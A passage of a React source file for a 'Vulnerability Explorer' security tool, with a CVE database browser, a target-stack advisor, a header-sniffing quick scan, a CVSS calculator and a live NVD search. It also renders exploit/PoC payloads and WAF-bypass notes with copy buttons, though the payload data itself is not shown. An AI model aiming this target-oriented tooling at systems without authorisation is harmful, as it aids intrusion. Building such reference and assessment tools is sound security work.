  { id: 'cvss', label: 'CVSS Calculator', icon: Calculator },
  { id: 'livesearch', label: 'Live Search', icon: Globe },
];


// ═══════════════════════════════════════════════════════════════
//  COMPONENT
// ═══════════════════════════════════════════════════════════════
export default function VulnExplorer() {
  const [tab, setTab] = useState('database');

  // --- Database state ---
  const [search, setSearch] = useState('');
  const [sevFilter, setSevFilter] = useState('');
  const [catFilter, setCatFilter] = useState('');
  const [platFilter, setPlatFilter] = useState('');
  const [yearFilter, setYearFilter] = useState('');
  const [sortBy, setSortBy] = useState('cvss');
  const [expanded, setExpanded] = useState({});

  // --- Advisor state ---
  const [selectedTech, setSelectedTech] = useState({});
  const [advisorUrl, setAdvisorUrl] = useState('');
  const [scanResult, setScanResult] = useState(null);
  const [scanning, setScanning] = useState(false);

  // --- Patterns state ---
  const [patternSearch, setPatternSearch] = useState('');

  // --- CVSS state ---
  const [cvssMetrics, setCvssMetrics] = useState({ AV: '', AC: '', PR: '', UI: '', S: '', C: '', I: '', A: '' });

  // --- Live NVD search ---
  const [liveQuery, setLiveQuery] = useState('');
  const [liveLoading, setLiveLoading] = useState(false);
  const [liveError, setLiveError] = useState(null);
  const [liveData, setLiveData] = useState(null);
  const [liveSubmittedQuery, setLiveSubmittedQuery] = useState('');
  const [liveStartIndex, setLiveStartIndex] = useState(0);

  const toggleExpand = useCallback((id) => {
    setExpanded(prev => ({ ...prev, [id]: !prev[id] }));
  }, []);

  // ─── CVE Database filtering ───
  const filteredCVEs = useMemo(() => {
    let results = CVE_DATABASE;
    if (search) {
      const q = search.toLowerCase();
      results = results.filter(c =>
        c.id.toLowerCase().includes(q) ||
        c.name.toLowerCase().includes(q) ||
        c.description.toLowerCase().includes(q) ||
        c.affected.toLowerCase().includes(q) ||
        c.tags.some(t => t.includes(q)) ||
        (c.exploit && c.exploit.toLowerCase().includes(q))
      );
    }
    if (sevFilter) results = results.filter(c => c.severity === sevFilter);
    if (catFilter) results = results.filter(c => c.category === catFilter);
    if (platFilter) results = results.filter(c => c.platform === platFilter);
    if (yearFilter) results = results.filter(c => c.published.startsWith(yearFilter));

    results = [...results].sort((a, b) => {
      if (sortBy === 'cvss') return b.cvss - a.cvss;
      if (sortBy === 'date') return new Date(b.published) - new Date(a.published);
      return a.id.localeCompare(b.id);
    });
    return results;
  }, [search, sevFilter, catFilter, platFilter, yearFilter, sortBy]);

  // ─── Advisor matching ───
  const advisorResults = useMemo(() => {
    const techs = Object.keys(selectedTech).filter(k => selectedTech[k]);
    if (techs.length === 0) return [];

    const scored = CVE_DATABASE.map(cve => {
      let score = 0;
      const reasons = [];
      for (const tech of techs) {
        const keywords = TECH_CVE_MAP[tech] || [tech.toLowerCase()];
        const matchesTag = cve.tags.some(tag => keywords.some(kw => tag.includes(kw)));
        const matchesAffected = keywords.some(kw => cve.affected.toLowerCase().includes(kw));
        const matchesDesc = keywords.some(kw => cve.description.toLowerCase().includes(kw));
        if (matchesTag) { score += 3; reasons.push(`Tags match "${tech}"`); }
        if (matchesAffected) { score += 4; reasons.push(`Affects "${tech}" directly`); }
        if (matchesDesc && !matchesTag && !matchesAffected) { score += 1; reasons.push(`Mentioned with "${tech}"`); }
      }
      if (cve.severity === 'Critical') score *= 1.5;
      else if (cve.severity === 'High') score *= 1.2;
      return { ...cve, relevanceScore: score, reasons };
    }).filter(c => c.relevanceScore > 0).sort((a, b) => b.relevanceScore - a.relevanceScore);
    return scored;
  }, [selectedTech]);

  const advisorGrouped = useMemo(() => {
    const groups = { 'Critical — Act Now': [], 'High Priority': [], 'Worth Checking': [], 'Low Risk': [] };
    for (const cve of advisorResults) {
      if (cve.severity === 'Critical' && cve.relevanceScore >= 4) groups['Critical — Act Now'].push(cve);
      else if ((cve.severity === 'Critical' || cve.severity === 'High') && cve.relevanceScore >= 2) groups['High Priority'].push(cve);
      else if (cve.relevanceScore >= 2) groups['Worth Checking'].push(cve);
      else groups['Low Risk'].push(cve);
    }
    return groups;
  }, [advisorResults]);

  // ─── Quick Scan ───
  const doQuickScan = useCallback(async () => {
    if (!advisorUrl) return;
    setScanning(true);
    setScanResult(null);
    try {
      let url = advisorUrl;
      if (!url.startsWith('http')) url = 'https://' + url;
      const resp = await fetch(url, { method: 'HEAD', mode: 'no-cors' }).catch(() => null);

      const detected = {};
      if (resp && resp.headers) {
        const server = resp.headers.get('server') || '';
        const powered = resp.headers.get('x-powered-by') || '';
        if (/apache/i.test(server)) detected['Apache'] = server;
        if (/nginx/i.test(server)) detected['Nginx'] = server;
        if (/iis/i.test(server)) detected['IIS'] = server;
        if (/php/i.test(powered)) detected['PHP'] = powered;
        if (/asp\.net/i.test(powered)) detected['.NET'] = powered;
        if (/express/i.test(powered)) detected['Node.js'] = powered;
      }
      setScanResult(Object.keys(detected).length > 0 ? detected : { note: 'No headers detected (CORS/opaque response). Try selecting technologies manually.' });
      const newTech = { ...selectedTech };
      Object.keys(detected).forEach(k => { if (k !== 'note') newTech[k] = true; });
      setSelectedTech(newTech);
    } catch {
      setScanResult({ error: 'Scan failed. The target may block cross-origin requests.' });
    }
    setScanning(false);
  }, [advisorUrl, selectedTech]);

  // ─── Pattern filtering ───
  const filteredPatterns = useMemo(() => {
    if (!patternSearch) return EXPLOIT_PATTERNS;
    const q = patternSearch.toLowerCase();
    const result = {};
    Object.entries(EXPLOIT_PATTERNS).forEach(([cat, entries]) => {
      const filtered = entries.filter(e =>
        e.name.toLowerCase().includes(q) ||
        e.payload.toLowerCase().includes(q) ||
        e.desc.toLowerCase().includes(q) ||
        (e.where && e.where.toLowerCase().includes(q)) ||
        (e.waf && e.waf.toLowerCase().includes(q))
      );
      if (filtered.length > 0) result[cat] = filtered;
    });
    return result;
  }, [patternSearch]);

  // ─── CVSS Result ───
  const cvssResult = useMemo(() => calcCVSS(cvssMetrics), [cvssMetrics]);
  const cvssVector = useMemo(() => {
    const { AV, AC, PR, UI, S, C, I, A } = cvssMetrics;
    if (!AV || !AC || !PR || !UI || !S || !C || !I || !A) return '';
    return `CVSS:3.1/AV:${AV}/AC:${AC}/PR:${PR}/UI:${UI}/S:${S}/C:${C}/I:${I}/A:${A}`;
  }, [cvssMetrics]);

  const totalPatterns = useMemo(() => Object.values(filteredPatterns).reduce((sum, arr) => sum + arr.length, 0), [filteredPatterns]);

  const fetchNvdPage = useCallback(async (query, startIdx) => {
    const q = query.trim();
    if (!q) {
      setLiveError('Enter a CVE ID (e.g. CVE-2021-44228) or a keyword.');
      setLiveData(null);
      return;
    }
    setLiveLoading(true);
    setLiveError(null);
    if (startIdx === 0) setLiveData(null);
    try {
      let url;
      if (NVD_CVE_ID_PATTERN.test(q)) {
        url = `${NVD_API_BASE}?cveId=${encodeURIComponent(q)}`;
      } else {
        url = `${NVD_API_BASE}?keywordSearch=${encodeURIComponent(q)}&resultsPerPage=10&startIndex=${startIdx}`;
      }
      const res = await fetch(url);
      if (!res.ok) {
        throw new Error(`NVD API returned HTTP ${res.status}. Try again or shorten your query.`);
      }
      const json = await res.json();
      setLiveData(json);
      setLiveSubmittedQuery(q);
      setLiveStartIndex(startIdx);
    } catch (err) {
      const msg = err?.message || String(err);
      setLiveError(
        /Failed to fetch|NetworkError|Load failed/i.test(msg)
          ? 'Could not reach the NVD API (network or CORS). If you are in a restricted browser context, try again from the desktop app or check your connection.'
          : msg
      );
      setLiveData(null);
    } finally {
      setLiveLoading(false);
    }
  }, []);

  const onLiveSearchSubmit = useCallback(
    (e) => {
      e?.preventDefault?.();
      fetchNvdPage(liveQuery, 0);
    },
    [liveQuery, fetchNvdPage]
  );

  const liveTotal = liveData?.totalResults ?? 0;
  const liveVulns = liveData?.vulnerabilities ?? [];
  const liveIsCveIdMode = NVD_CVE_ID_PATTERN.test(liveSubmittedQuery);
  const liveCanPrev = !liveIsCveIdMode && liveStartIndex > 0;
  const liveCanNext = !liveIsCveIdMode && liveStartIndex + 10 < liveTotal;

  return (
    <div style={s.page}>
      {/* Header */}
      <div style={s.headerRow}>
        <div style={s.iconBox}><Bug size={20} color={accent} /></div>
        <h1 style={s.title}>Vulnerability Explorer</h1>
      </div>

      {/* Tabs */}
      <div style={s.tabRow}>
        {TABS.map(t => (
          <button key={t.id} style={s.tab(tab === t.id)} onClick={() => setTab(t.id)}>
            <span style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
              <t.icon size={14} />
              {t.label}
            </span>
          </button>
        ))}
      </div>

      {/* ════════════════════════════════════════════════════ */}
      {/*  TAB 1: CVE DATABASE                                */}
      {/* ════════════════════════════════════════════════════ */}
      {tab === 'database' && (
        <div>
          {/* Search */}
          <div style={s.searchRow}>
            <div style={{ position: 'relative', flex: 1, minWidth: 260 }}>
              <Search size={15} color="#64748B" style={{ position: 'absolute', left: 12, top: 11 }} />
              <input style={s.searchInput} placeholder="Search CVEs, names, descriptions, exploits, tags..." value={search} onChange={e => setSearch(e.target.value)} />
            </div>
            <select style={s.selectBox} value={catFilter} onChange={e => setCatFilter(e.target.value)}>
              <option value="">All Categories</option>
              {CATEGORIES.map(c => <option key={c} value={c}>{c}</option>)}
            </select>
            <select style={s.selectBox} value={platFilter} onChange={e => setPlatFilter(e.target.value)}>
              <option value="">All Platforms</option>
              {PLATFORMS.map(p => <option key={p} value={p}>{p}</option>)}
            </select>
            <select style={s.selectBox} value={yearFilter} onChange={e => setYearFilter(e.target.value)}>
              <option value="">All Years</option>
              {YEARS.map(y => <option key={y} value={y}>{y}</option>)}
            </select>
          </div>

          {/* Severity chips + sort */}
          <div style={{ display: 'flex', gap: 8, marginBottom: 16, flexWrap: 'wrap', alignItems: 'center' }}>
            {['Critical', 'High', 'Medium', 'Low'].map(sev => (
              <button key={sev} style={s.filterChip(sevFilter === sev)} onClick={() => setSevFilter(sevFilter === sev ? '' : sev)}>
                {sev}
              </button>
            ))}
            <div style={{ flex: 1 }} />
            <button style={s.sortBtn(sortBy === 'cvss')} onClick={() => setSortBy('cvss')}>
              <ArrowUpDown size={11} /> CVSS
            </button>
            <button style={s.sortBtn(sortBy === 'date')} onClick={() => setSortBy('date')}>
              <Clock size={11} /> Date
            </button>
            <button style={s.sortBtn(sortBy === 'alpha')} onClick={() => setSortBy('alpha')}>
              <Hash size={11} /> ID
            </button>
          </div>

          <div style={s.resultCount}>
            Showing {filteredCVEs.length} of {CVE_DATABASE.length} vulnerabilities
          </div>

          {/* CVE List */}
          <div>
            {filteredCVEs.map(cve => {
              const isOpen = expanded[cve.id];
              return (
                <div key={cve.id} style={{ ...s.cveCard, borderColor: isOpen ? `${accent}30` : 'rgba(255,255,255,0.05)' }}>
                  <div style={s.cveHeader} onClick={() => toggleExpand(cve.id)}>
                    {isOpen ? <ChevronDown size={14} color="#64748B" /> : <ChevronRight size={14} color="#64748B" />}
                    <span style={s.cveId}>{cve.id}</span>
                    <span style={s.cveName}>{cve.name}</span>
                    <span style={{ flex: 1 }} />
                    <span style={s.badge(SEV_COLORS[cve.severity])}>{cve.severity}</span>
                    <span style={s.cvssScore}>{cve.cvss.toFixed(1)}</span>
                    <span style={s.pill}>{cve.category}</span>
                    <span style={s.pill}>{cve.platform}</span>
                  </div>
                  {isOpen && (
                    <div style={s.expandedBody}>
                      <p style={s.desc}>{cve.description}</p>

                      <div style={{ fontFamily: mono, fontSize: 10, color: '#64748B', marginBottom: 10 }}>
                        <strong style={{ color: '#94A3B8' }}>Affected:</strong> {cve.affected} &nbsp;|&nbsp;
                        <strong style={{ color: '#94A3B8' }}>Published:</strong> {cve.published}
                      </div>

                      {cve.exploit && (
                        <div>
                          <div style={{ fontFamily: heading, fontSize: 12, fontWeight: 600, color: '#E2E8F0', marginBottom: 6, display: 'flex', alignItems: 'center', gap: 6 }}>
                            <Zap size={12} color={accent} /> Exploit / PoC
                          </div>
                          <div style={s.codeBlock}>
                            {cve.exploit}
                            <div style={{ position: 'absolute', top: 8, right: 8 }}>
                              <CopyButton text={cve.exploit} />
                            </div>
                          </div>
                        </div>
                      )}

                      <div style={s.mitigationBox}>
                        <div style={{ fontFamily: heading, fontSize: 12, fontWeight: 600, color: '#4ADE80', marginBottom: 4, display: 'flex', alignItems: 'center', gap: 6 }}>
                          <Shield size={12} /> Mitigation
                        </div>
                        <div style={s.mitigationText}>{cve.mitigation}</div>
                      </div>

                      {cve.references.length > 0 && (
                        <div style={{ marginBottom: 10 }}>
                          {cve.references.map((ref, i) => (
                            <a key={i} href={ref} target="_blank" rel="noopener noreferrer" style={{ ...s.link, display: 'inline-flex', alignItems: 'center', gap: 4, marginRight: 12 }}>
                              <ExternalLink size={10} /> {ref.replace('https://', '').slice(0, 50)}
                            </a>
                          ))}
                        </div>
                      )}

                      <div style={{ display: 'flex', flexWrap: 'wrap', gap: 2 }}>
                        {cve.tags.map(t => <span key={t} style={s.tagSmall}>{t}</span>)}
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}

      {/* ════════════════════════════════════════════════════ */}
      {/*  TAB 2: VULNERABILITY ADVISOR                       */}
      {/* ════════════════════════════════════════════════════ */}
      {tab === 'advisor' && (
        <div>
          <div style={s.sectionTitle}>
            <Target size={16} color={accent} /> Select Your Target's Technology Stack
          </div>

          {Object.entries(TECH_CATEGORIES).map(([catName, techs]) => (
            <div key={catName} style={{ marginBottom: 16 }}>
              <div style={{ fontFamily: heading, fontSize: 12, fontWeight: 600, color: '#94A3B8', marginBottom: 8 }}>{catName}</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
                {techs.map(tech => (
                  <button key={tech} style={s.advChip(selectedTech[tech])} onClick={() => setSelectedTech(prev => ({ ...prev, [tech]: !prev[tech] }))}>
                    {tech}
                  </button>
                ))}
              </div>
            </div>
          ))}

          {/* Quick Scan */}
          <div style={{ ...s.cveCard, padding: 18, marginTop: 20 }}>
            <div style={{ fontFamily: heading, fontSize: 14, fontWeight: 600, color: '#E2E8F0', marginBottom: 10, display: 'flex', alignItems: 'center', gap: 8 }}>
              <Globe size={14} color={accent} /> Quick Scan (Header Detection)
            </div>
            <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
              <input style={{ ...s.searchInput, flex: 1, paddingLeft: 14 }} placeholder="https://target.com" value={advisorUrl} onChange={e => setAdvisorUrl(e.target.value)} />
              <button onClick={doQuickScan} disabled={scanning} style={{ ...s.metricBtn(true), opacity: scanning ? 0.5 : 1, display: 'flex', alignItems: 'center', gap: 6 }}>
                {scanning ? <Activity size={13} /> : <Zap size={13} />} {scanning ? 'Scanning...' : 'Quick Scan'}
              </button>
            </div>
            {scanResult && (
              <div style={{ marginTop: 12, fontFamily: mono, fontSize: 11, color: scanResult.error ? '#EF4444' : '#94A3B8' }}>
                {scanResult.error && <span>{scanResult.error}</span>}
                {scanResult.note && <span>{scanResult.note}</span>}
                {!scanResult.error && !scanResult.note && Object.entries(scanResult).map(([k, v]) => (
                  <div key={k} style={{ marginBottom: 4 }}>
                    <span style={{ color: '#4ADE80' }}>{k}:</span> {v}
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Results */}
          {advisorResults.length > 0 && (
            <div style={{ marginTop: 24 }}>
              <div style={s.resultCount}>{advisorResults.length} vulnerabilities match your stack</div>
              {Object.entries(advisorGrouped).map(([group, cves]) => {
                if (cves.length === 0) return null;
                const groupColors = {
                  'Critical — Act Now': '#EF4444',
                  'High Priority': '#F97316',
                  'Worth Checking': '#EAB308',
                  'Low Risk': '#22C55E',
                };
                return (
                  <div key={group} style={{ marginBottom: 20 }}>
                    <div style={{ fontFamily: heading, fontSize: 14, fontWeight: 700, color: groupColors[group], marginBottom: 10, display: 'flex', alignItems: 'center', gap: 8 }}>
                      <AlertTriangle size={14} /> {group} ({cves.length})
                    </div>
                    {cves.slice(0, 15).map(cve => (
                      <div key={cve.id} style={s.patternCard}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 10, flexWrap: 'wrap' }}>
                          <span style={s.cveId}>{cve.id}</span>
                          <span style={s.cveName}>{cve.name}</span>
                          <span style={s.badge(SEV_COLORS[cve.severity])}>{cve.severity}</span>
                          <span style={s.cvssScore}>{cve.cvss.toFixed(1)}</span>
                        </div>
                        <div style={{ fontFamily: mono, fontSize: 11, color: '#4ADE80', marginTop: 6 }}>
                          {cve.reasons?.slice(0, 2).join(' • ')}
                        </div>
                        <div style={{ fontFamily: mono, fontSize: 11, color: '#94A3B8', marginTop: 4 }}>
                          {cve.description.slice(0, 140)}...
                        </div>
                      </div>
                    ))}
                    {cves.length > 15 && <div style={{ fontFamily: mono, fontSize: 11, color: '#64748B', paddingLeft: 8 }}>+ {cves.length - 15} more...</div>}
                  </div>
                );
              })}
            </div>
          )}

          {advisorResults.length === 0 && Object.keys(selectedTech).some(k => selectedTech[k]) && (
            <div style={{ textAlign: 'center', padding: 40, color: '#64748B', fontFamily: mono, fontSize: 12 }}>
              No matching CVEs found for selected technologies.
            </div>
          )}
        </div>
      )}

      {/* ════════════════════════════════════════════════════ */}
      {/*  TAB 3: EXPLOIT PATTERNS                            */}
      {/* ════════════════════════════════════════════════════ */}
      {tab === 'patterns' && (
        <div>
          <div style={{ position: 'relative', marginBottom: 20 }}>
            <Search size={15} color="#64748B" style={{ position: 'absolute', left: 12, top: 11 }} />
            <input style={s.searchInput} placeholder="Search exploit patterns, payloads, techniques..." value={patternSearch} onChange={e => setPatternSearch(e.target.value)} />
          </div>

          <div style={s.resultCount}>{totalPatterns} patterns across {Object.keys(filteredPatterns).length} categories</div>

          {Object.entries(filteredPatterns).map(([cat, entries]) => (
            <div key={cat}>
              <div style={s.sectionTitle}>
                <Code size={14} color={accent} /> {cat} <span style={{ ...s.pill, marginLeft: 4 }}>{entries.length}</span>
              </div>
              {entries.map((entry, i) => (
                <div key={i} style={s.patternCard}>
                  <div style={s.patternName}>{entry.name}</div>
                  <div style={s.codeBlock}>
                    {entry.payload}
                    <div style={{ position: 'absolute', top: 6, right: 6 }}>
                      <CopyButton text={entry.payload} />
                    </div>
                  </div>
                  <div style={s.patternDesc}>{entry.desc}</div>
                  <div style={s.patternMeta}>
                    <strong style={{ color: '#94A3B8' }}>Where:</strong> {entry.where}
                    {entry.waf && <>&nbsp;&nbsp;|&nbsp;&nbsp;<strong style={{ color: '#94A3B8' }}>WAF Bypass:</strong> {entry.waf}</>}
                  </div>
                </div>
              ))}
            </div>
          ))}
        </div>
      )}

      {/* ════════════════════════════════════════════════════ */}
      {/*  TAB 4: CVSS CALCULATOR                             */}
      {/* ════════════════════════════════════════════════════ */}
      {tab === 'cvss' && (
        <div>
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 24 }}>
            {/* Left: Metric buttons */}
            <div>
              {Object.entries(CVSS_METRICS).map(([key, metric]) => (
                <div key={key} style={s.metricGroup}>
                  <div style={s.metricLabel}>{metric.name} ({key})</div>
                  <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                    {metric.options.map(opt => (
                      <button key={opt.value} style={s.metricBtn(cvssMetrics[key] === opt.value)} onClick={() => setCvssMetrics(prev => ({ ...prev, [key]: opt.value }))}>
                        {opt.label} ({opt.value})
                      </button>
                    ))}
                  </div>
                </div>
              ))}

              <button
                onClick={() => setCvssMetrics({ AV: '', AC: '', PR: '', UI: '', S: '', C: '', I: '', A: '' })}
                style={{ ...s.metricBtn(false), marginTop: 8, color: '#EF4444', borderColor: 'rgba(239,68,68,0.3)' }}
              >
                Reset All
              </button>
            </div>

            {/* Right: Score display */}
            <div>
              <Card style={{ background: '#0D1117', textAlign: 'center', padding: '32px 24px' }}>
                {cvssResult ? (
                  <>
                    <div style={s.bigScore(SEV_COLORS[cvssResult.severity] || '#64748B')}>
                      {cvssResult.score.toFixed(1)}
                    </div>
                    <div style={{ ...s.badge(SEV_COLORS[cvssResult.severity] || '#334155'), fontSize: 14, padding: '4px 16px', marginTop: 12, display: 'inline-block' }}>
                      {cvssResult.severity}
                    </div>

                    {cvssVector && (
                      <div style={s.vectorString}>
                        <span style={{ fontSize: 11, wordBreak: 'break-all' }}>{cvssVector}</span>
                        <CopyButton text={cvssVector} />
                      </div>
                    )}

                    <div style={{ marginTop: 24, textAlign: 'left' }}>
                      <div style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#E2E8F0', marginBottom: 12 }}>Score Breakdown</div>

                      <div style={{ marginBottom: 12 }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: mono, fontSize: 11, color: '#94A3B8', marginBottom: 4 }}>
                          <span>Impact</span>
                          <span>{cvssResult.impact.toFixed(2)}</span>
                        </div>
                        <div style={{ background: 'rgba(255,255,255,0.06)', borderRadius: 4, height: 6, overflow: 'hidden' }}>
                          <div style={{ width: `${Math.min((cvssResult.impact / 6.42) * 100, 100)}%`, height: '100%', background: accent, borderRadius: 4 }} />
                        </div>
                      </div>

                      <div style={{ marginBottom: 12 }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: mono, fontSize: 11, color: '#94A3B8', marginBottom: 4 }}>
                          <span>Exploitability</span>
                          <span>{cvssResult.exploitability.toFixed(2)}</span>
                        </div>
                        <div style={{ background: 'rgba(255,255,255,0.06)', borderRadius: 4, height: 6, overflow: 'hidden' }}>
                          <div style={{ width: `${Math.min((cvssResult.exploitability / 3.89) * 100, 100)}%`, height: '100%', background: '#A78BFA', borderRadius: 4 }} />
                        </div>
                      </div>

                      <div>
                        <div style={{ display: 'flex', justifyContent: 'space-between', fontFamily: mono, fontSize: 11, color: '#94A3B8', marginBottom: 4 }}>
                          <span>ISS (Impact Sub Score)</span>
                          <span>{cvssResult.iss.toFixed(3)}</span>
                        </div>
                        <div style={{ background: 'rgba(255,255,255,0.06)', borderRadius: 4, height: 6, overflow: 'hidden' }}>
                          <div style={{ width: `${cvssResult.iss * 100}%`, height: '100%', background: '#22C55E', borderRadius: 4 }} />
                        </div>
                      </div>
                    </div>
                  </>
                ) : (
                  <div>
                    <Calculator size={48} color="#334155" style={{ marginBottom: 16 }} />
                    <div style={{ fontFamily: heading, fontSize: 15, color: '#64748B' }}>Select all metrics</div>
                    <div style={{ fontFamily: mono, fontSize: 11, color: '#475569', marginTop: 4 }}>to calculate CVSS v3.1 score</div>
                  </div>
                )}
              </Card>

              {/* Quick presets */}
              <div style={{ marginTop: 16 }}>
                <div style={{ fontFamily: heading, fontSize: 12, fontWeight: 600, color: '#94A3B8', marginBottom: 8 }}>Quick Presets</div>
                <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                  <button style={s.metricBtn(false)} onClick={() => setCvssMetrics({ AV: 'N', AC: 'L', PR: 'N', UI: 'N', S: 'C', C: 'H', I: 'H', A: 'H' })}>
                    Log4Shell (10.0)
                  </button>
                  <button style={s.metricBtn(false)} onClick={() => setCvssMetrics({ AV: 'N', AC: 'L', PR: 'N', UI: 'N', S: 'U', C: 'H', I: 'H', A: 'H' })}>
                    EternalBlue (9.8)
                  </button>
                  <button style={s.metricBtn(false)} onClick={() => setCvssMetrics({ AV: 'L', AC: 'L', PR: 'L', UI: 'N', S: 'U', C: 'H', I: 'H', A: 'H' })}>
                    DirtyPipe (7.8)
                  </button>
                  <button style={s.metricBtn(false)} onClick={() => setCvssMetrics({ AV: 'N', AC: 'L', PR: 'N', UI: 'R', S: 'C', C: 'L', I: 'L', A: 'N' })}>
                    Typical XSS (6.1)
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ════════════════════════════════════════════════════ */}
      {/*  TAB 5: LIVE NVD SEARCH                               */}
      {/* ════════════════════════════════════════════════════ */}
      {tab === 'livesearch' && (
        <div>
          <style>{`@keyframes nvdLiveSpin { to { transform: rotate(360deg); } }`}</style>
          <p style={{ fontFamily: mono, fontSize: 12, color: '#94A3B8', marginBottom: 16, lineHeight: 1.6 }}>
            Query the National Vulnerability Database in real time. Use a full CVE ID for an exact match, or any keyword
            for full-text search (10 results per page).
          </p>

          <form onSubmit={onLiveSearchSubmit} style={{ ...s.searchRow, marginBottom: 20 }}>
            <div style={{ position: 'relative', flex: 1, minWidth: 260 }}>
              <Search size={15} color="#64748B" style={{ position: 'absolute', left: 12, top: 11 }} />
              <input
                style={s.searchInput}
                placeholder="CVE-2021-44228 or log4j, openssl, …"
                value={liveQuery}
                onChange={(e) => setLiveQuery(e.target.value)}
                disabled={liveLoading}
              />
            </div>
            <button
              type="submit"
              disabled={liveLoading}
              style={{
                ...s.metricBtn(true),
                opacity: liveLoading ? 0.7 : 1,
                cursor: liveLoading ? 'wait' : 'pointer',
                padding: '10px 22px',
                display: 'inline-flex',
                alignItems: 'center',
                gap: 8,
              }}
            >
              {liveLoading ? (
                <>
                  <Loader2 size={16} style={{ animation: 'nvdLiveSpin 0.75s linear infinite' }} />
                  Searching…
                </>
              ) : (
                <>
                  <Globe size={16} />
                  Search
                </>
              )}
            </button>
          </form>

          {liveLoading && liveData == null && (
            <div
              style={{
                display: 'flex',
                alignItems: 'center',
                gap: 12,
                padding: 24,
                borderRadius: 10,
                background: '#0D1117',
                border: '1px solid rgba(255,255,255,0.06)',
                marginBottom: 16,
              }}
            >
              <Loader2 size={24} color={accent} style={{ animation: 'nvdLiveSpin 0.75s linear infinite' }} />
              <span style={{ fontFamily: mono, fontSize: 13, color: '#94A3B8' }}>Contacting NVD…</span>
            </div>
          )}

          {liveError && (
            <div
              style={{
                padding: 14,
                borderRadius: 10,
                background: 'rgba(239, 68, 68, 0.1)',
                border: '1px solid rgba(239, 68, 68, 0.35)',
                color: '#FCA5A5',
                fontFamily: mono,
                fontSize: 12,
                lineHeight: 1.55,
                marginBottom: 16,
              }}
            >
              {liveError}
            </div>
          )}

          {liveData && !liveError && (
            <>
              <div style={{ ...s.resultCount, marginBottom: 12 }}>
                {liveIsCveIdMode ? (
                  <span>
                    CVE lookup · {liveVulns.length === 0 ? 'No record found' : '1 match'}
                  </span>
                ) : (
                  <span>
                    Showing {liveStartIndex + 1}–{Math.min(liveStartIndex + liveVulns.length, liveTotal)} of{' '}
                    {liveTotal} results
                    {liveSubmittedQuery ? ` for “${liveSubmittedQuery}”` : ''}
                  </span>
                )}
              </div>

              {!liveIsCveIdMode && liveTotal > 0 && (
                <div style={{ display: 'flex', gap: 10, alignItems: 'center', marginBottom: 16, flexWrap: 'wrap' }}>
                  <button
                    type="button"
                    disabled={!liveCanPrev || liveLoading}
                    onClick={() => fetchNvdPage(liveSubmittedQuery, Math.max(0, liveStartIndex - 10))}
                    style={{
                      ...s.sortBtn(liveCanPrev),
                      opacity: !liveCanPrev || liveLoading ? 0.45 : 1,
                      cursor: !liveCanPrev || liveLoading ? 'not-allowed' : 'pointer',
                      display: 'inline-flex',
                      alignItems: 'center',
                      gap: 6,
                    }}
                  >
                    <ChevronLeft size={14} /> Previous
                  </button>
                  <button
                    type="button"
                    disabled={!liveCanNext || liveLoading}
                    onClick={() => fetchNvdPage(liveSubmittedQuery, liveStartIndex + 10)}
                    style={{
                      ...s.sortBtn(liveCanNext),
                      opacity: !liveCanNext || liveLoading ? 0.45 : 1,
                      cursor: !liveCanNext || liveLoading ? 'not-allowed' : 'pointer',
                      display: 'inline-flex',
                      alignItems: 'center',
                      gap: 6,
                    }}
                  >
                    Next <ChevronRight size={14} />
                  </button>
                  <span style={{ fontFamily: mono, fontSize: 10, color: '#64748B' }}>
                    Page {Math.floor(liveStartIndex / 10) + 1} · {liveTotal === 0 ? 0 : Math.ceil(liveTotal / 10)} total
                    pages
                  </span>
                </div>
              )}

              {liveVulns.length === 0 && !liveLoading && (
                <p style={{ fontFamily: mono, fontSize: 12, color: '#64748B', margin: 0 }}>No CVEs returned.</p>
              )}

              <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                {liveVulns.map((wrap) => {
                  const cve = wrap?.cve;
                  if (!cve?.id) return null;
                  const cvss = nvdExtractCvss(cve);
                  const band = nvdLiveSeverityBand(cvss);
                  const desc = nvdParseDescription(cve);
                  const refs = nvdParseRefs(cve);
                  const published = cve.published
                    ? new Date(cve.published).toLocaleDateString(undefined, {
                        year: 'numeric',
                        month: 'short',
                        day: 'numeric',
                      })
                    : '—';

                  return (
                    <div
                      key={cve.id}
                      style={{
                        ...s.cveCard,
                        cursor: 'default',
                        marginBottom: 0,
                        background: '#0D1117',
                        border: '1px solid rgba(255,255,255,0.08)',
                      }}
                    >
                      <div style={{ ...s.cveHeader, flexWrap: 'wrap', alignItems: 'flex-start' }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 10, flexWrap: 'wrap', flex: 1, minWidth: 0 }}>
                          <span style={s.cveId}>{cve.id}</span>
                          <span style={{ ...s.badge(band.bg), color: band.color }}>{band.label}</span>
                          <span style={{ ...s.cvssScore, border: `1px solid ${band.bg}55` }}>
                            CVSS {cvss != null ? cvss.toFixed(1) : '—'}
                          </span>
                          <CopyButton text={cve.id} />
                        </div>
                        <span style={{ ...s.pill, marginTop: 4 }}>Published {published}</span>
                      </div>
                      <div style={{ ...s.expandedBody, borderTop: '1px solid rgba(255,255,255,0.06)', paddingTop: 14 }}>
                        <p style={{ ...s.desc, marginTop: 0 }}>{desc}</p>
                        {refs.length > 0 && (
                          <div style={{ marginTop: 8 }}>
                            <div
                              style={{
                                fontFamily: heading,
                                fontSize: 11,
                                fontWeight: 600,
                                color: '#94A3B8',
                                marginBottom: 8,
                              }}
                            >
                              References
                            </div>
                            <ul style={{ margin: 0, paddingLeft: 18, fontFamily: mono, fontSize: 10, color: '#94A3B8' }}>
                              {refs.slice(0, 8).map((href, ri) => (
                                <li key={`${cve.id}-ref-${ri}`} style={{ marginBottom: 6, wordBreak: 'break-all' }}>
                                  <a href={href} target="_blank" rel="noopener noreferrer" style={s.link}>
                                    {href}
                                    <ExternalLink size={10} style={{ display: 'inline', marginLeft: 4, verticalAlign: 'middle' }} />
